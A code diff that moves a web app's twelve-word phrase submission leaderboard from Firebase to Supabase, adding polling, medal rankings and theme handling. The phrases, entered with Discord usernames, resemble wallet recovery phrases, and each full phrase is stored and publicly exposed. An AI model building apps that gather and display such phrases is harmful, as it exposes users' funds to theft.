@@ -19,63 +19,32 @@ const themeToggle = document.getElementById('themeToggle');
 // State
 let wordInputs = [];
 let isDarkMode = localStorage.getItem('darkMode') === 'true';
-
-// Fallback to localStorage if Firebase CDN is not available
-if (typeof firebase === 'undefined') {
-    firebase = {
-        database: () => ({
-            ref: (path) => ({
-                set: async (data) => {
-                    const submissions = JSON.parse(localStorage.getItem('submissions') || '{}');
-                    const pathParts = path.split('/');
-                    if (pathParts[0] === 'submissions') {
-                        submissions[pathParts[1]] = data;
-                        localStorage.setItem('submissions', JSON.stringify(submissions));
-                    }
-                },
-                push: () => ({
-                    key: Date.now().toString()
-                }),
-                orderByChild: (field) => ({
-                    limitToLast: (limit) => ({
-                        once: async (event) => {
-                            const submissions = JSON.parse(localStorage.getItem('submissions') || '{}');
-                            return {
-                                exists: () => Object.keys(submissions).length > 0,
-                                forEach: (callback) => {
-                                    Object.entries(submissions).reverse().forEach(([key, val]) => {
-                                        callback({ val: () => val });
-                                    });
-                                }
-                            };
-                        }
-                    })
-                }),
-                once: async (event) => {
-                    const submissions = JSON.parse(localStorage.getItem('submissions') || '{}');
-                    return {
-                        exists: () => Object.keys(submissions).length > 0,
-                        forEach: (callback) => {
-                            Object.entries(submissions).reverse().forEach(([key, val]) => {
-                                callback({ val: () => val });
-                            });
-                        }
-                    };
-                }
-            })
-        })
-    };
-}
+let submissionCache = []; // Cache submissions for ranking
 
 // Initialize the application
-function init() {
+async function init() {
     createWordInputs();
     setupEventListeners();
     loadTheme();
-    loadSubmissions();
     
-    // Load submissions every 5 seconds to show live updates
-    setInterval(loadSubmissions, 5000);
+    // Wait longer for Supabase to initialize, then start polling
+    console.log('⏳ Waiting for Supabase to initialize...');
+    
+    let attempts = 0;
+    const waitForSupabase = setInterval(() => {
+        attempts++;
+        if (typeof window !== 'undefined' && window.supabaseClient) {
+            clearInterval(waitForSupabase);
+            console.log('✅ Supabase ready! Starting submission updates...');
+            loadSubmissions();
+            // Load submissions every 3 seconds for live updates
+            setInterval(loadSubmissions, 3000);
+        } else if (attempts > 100) {
+            clearInterval(waitForSupabase);
+            console.error('❌ Supabase initialization timed out');
+            submissionsList.innerHTML = '<div class="loading">Failed to connect to database. Check browser console.</div>';
+        }
+    }, 100);
 }
 
 // Create 12 word input boxes
@@ -226,20 +195,43 @@ async function handleSubmit(e) {
     submitBtn.disabled = true;
     
     try {
+        // Get Supabase client (might be async)
+        let supabaseClient = getSupabase();
+        
+        // If it's a promise, wait for it
+        if (supabaseClient && typeof supabaseClient.then === 'function') {
+            supabaseClient = await supabaseClient;
+        }
+        
+        if (!supabaseClient) {
+            throw new Error('Supabase client not initialized. Waiting for connection...');
+        }
+        
         // Prepare submission data
         const phrase = wordInputs.map(input => input.value.trim().toLowerCase()).join(' ');
-        const timestamp = new Date().toISOString();
+        const now = new Date().toISOString();
         
         const submission = {
-            discord: discord,
+            discord_username: discord,
             phrase: phrase,
-            timestamp: timestamp,
-            verified: true
+            is_valid: true,
+            submitted_at: now
         };
         
-        // Save to Firebase
-        const submissionId = firebase.database().ref('submissions').push().key;
-        await firebase.database().ref(`submissions/${submissionId}`).set(submission);
+        console.log('Submitting to Supabase:', submission);
+        
+        // Save to Supabase
+        const { data, error } = await supabaseClient
+            .from('submissions')
+            .insert([submission])
+            .select();
+        
+        if (error) {
+            console.error('Supabase error:', error);
+            throw new Error(`Database error: ${error.message}`);
+        }
+        
+        console.log('✅ Submission saved successfully', data);
         
         // Reset form after 2 seconds
         setTimeout(() => {
@@ -258,41 +250,59 @@ async function handleSubmit(e) {
         }, 1000);
         
     } catch (error) {
-        console.error('Error submitting phrase:', error);
-        const errorMsg = error.message || 'Unknown error';
+        console.error('❌ Error submitting phrase:', error);
+        const errorMsg = error.message || 'Unknown error. Check console for details.';
         showValidationMessage(`Error: ${errorMsg}`, 'error');
         submitBtn.disabled = false;
     }
 }
 
-// Load all submissions from Firebase
+// Load all submissions from Supabase
 async function loadSubmissions() {
     try {
-        const snapshot = await firebase.database().ref('submissions')
-            .orderByChild('timestamp')
-            .limitToLast(50)
-            .once('value');
+        let supabaseClient = getSupabase();
+        
+        // If it's a promise, wait for it
+        if (supabaseClient && typeof supabaseClient.then === 'function') {
+            supabaseClient = await supabaseClient;
+        }
+        
+        if (!supabaseClient) {
+            submissionsList.innerHTML = '<div class="loading">Initializing database connection...</div>';
+            return;
+        }
+        
+        // Fetch submissions ordered by submission time (earliest first)
+        const { data: submissions, error } = await supabaseClient
+            .from('submissions')
+            .select('*')
+            .eq('is_valid', true)
+            .order('submitted_at', { ascending: true })
+            .limit(100);
+        
+        if (error) {
+            console.error('Error loading submissions:', error);
+            submissionsList.innerHTML = '<div class="loading">Error loading submissions</div>';
+            return;
+        }
         
         submissionsList.innerHTML = '';
         
-        if (!snapshot.exists()) {
+        if (!submissions || submissions.length === 0) {
             submissionsList.innerHTML = `
                 <div class="empty-state">
                     <div class="empty-state-icon">📭</div>
                     <div class="empty-state-text">No verified submissions yet. Be the first!</div>
                 </div>
             `;
+            submissionCache = [];
             return;
         }
         
-        const submissions = [];
-        snapshot.forEach((childSnapshot) => {
-            submissions.push(childSnapshot.val());
-        });
+        // Update cache
+        submissionCache = submissions;
         
-        // Show oldest first (rank #1, #2, etc.)
-        // submissions.reverse(); // Removed
-
+        // Show submissions with ranking (1st, 2nd, 3rd, etc.)
         submissions.forEach((submission, index) => {
             const rank = index + 1;
             const item = createSubmissionItem(submission, rank);
@@ -300,27 +310,33 @@ async function loadSubmissions() {
         });
         
     } catch (error) {
-        console.error('Error loading submissions:', error);
+        console.error('Unexpected error loading submissions:', error);
         submissionsList.innerHTML = '<div class="loading">Error loading submissions</div>';
     }
 }
 
 // Create a submission display item
-// Create a submission display item
 function createSubmissionItem(submission, rank) {
     const item = document.createElement('div');
     item.className = 'submission-item';
     
-    const timeAgo = formatTimeAgo(new Date(submission.timestamp));
+    const timeAgo = formatTimeAgo(new Date(submission.submitted_at));
     const phraseWords = submission.phrase.split(' ').slice(0, 3).join(' ') + '...';
+    
+    // Determine medal for top 3
+    let medal = '';
+    if (rank === 1) medal = '🥇';
+    else if (rank === 2) medal = '🥈';
+    else if (rank === 3) medal = '🥉';
+    else medal = `#${rank}`;
     
     item.innerHTML = `
         <div class="submission-header">
             <div class="submission-username">
-                <span class="submission-rank">#${rank}</span>
-                🎮 ${escapeHtml(submission.discord)}
+                <span class="submission-rank">${medal}</span>
+                🎮 ${escapeHtml(submission.discord_username)}
             </div>
-            <div class="submission-status">✅ Verified</div>
+            <div class="submission-status">✅ Valid</div>
             <div class="submission-time">${timeAgo}</div>
         </div>
         <div class="submission-phrase" title="${escapeHtml(submission.phrase)}">
@@ -342,7 +358,9 @@ function formatTimeAgo(date) {
     const hours = Math.floor(minutes / 60);
     if (hours < 24) return `${hours}h ago`;
     const days = Math.floor(hours / 24);
-    return `${days}d ago`;
+    if (days < 30) return `${days}d ago`;
+    const months = Math.floor(days / 30);
+    return `${months}mo ago`;
 }
 
 // Escape HTML to prevent XSS
@@ -376,23 +394,73 @@ function setupEventListeners() {
 // Toggle dark mode
 function toggleTheme() {
     isDarkMode = !isDarkMode;
-    localStorage.setItem('darkMode', isDarkMode);
-    loadTheme();
+    localStorage.setItem('darkMode', isDarkMode.toString());
+    applyTheme();
+}
+
+// Apply theme to DOM
+function applyTheme() {
+    const icon = document.querySelector('.theme-icon');
+    if (!icon) return;
+    
+    if (isDarkMode) {
+        document.documentElement.style.colorScheme = 'dark';
+        document.body.classList.add('dark-mode');
+        document.body.classList.remove('light-mode');
+        icon.textContent = '☀️';
+        console.log('✅ Dark mode enabled');
+    } else {
+        document.documentElement.style.colorScheme = 'light';
+        document.body.classList.remove('dark-mode');
+        document.body.classList.add('light-mode');
+        icon.textContent = '🌙';
+        console.log('✅ Light mode enabled');
+    }
 }
 
 // Load theme preference
 function loadTheme() {
-    const icon = document.querySelector('.theme-icon');
-    if (isDarkMode) {
-        document.body.classList.add('dark-mode');
-        icon.textContent = '☀️';
+    const saved = localStorage.getItem('darkMode');
+    if (saved !== null) {
+        isDarkMode = saved === 'true';
     } else {
-        document.body.classList.remove('dark-mode');
-        icon.textContent = '🌙';
+        // Check system preference
+        isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
     }
+    applyTheme();
 }
 
-// Wait for Firebase to be initialized before starting
+// Get Supabase client instance
+function getSupabase() {
+    // Check if client exists
+    if (typeof window !== 'undefined' && window.supabaseClient) {
+        return window.supabaseClient;
+    }
+    
+    // If still loading, wait and try again
+    if (!window.supabaseClient) {
+        console.warn('Waiting for Supabase to initialize...');
+        // Give it a moment to initialize
+        return new Promise(resolve => {
+            let attempts = 0;
+            const checkInit = setInterval(() => {
+                attempts++;
+                if (window.supabaseClient) {
+                    clearInterval(checkInit);
+                    resolve(window.supabaseClient);
+                } else if (attempts > 50) {
+                    clearInterval(checkInit);
+                    console.error('Supabase failed to initialize');
+                    resolve(null);
+                }
+            }, 100);
+        });
+    }
+    
+    return null;
+}
+
+// Wait for document to be ready before starting
 if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', init);
 } else {
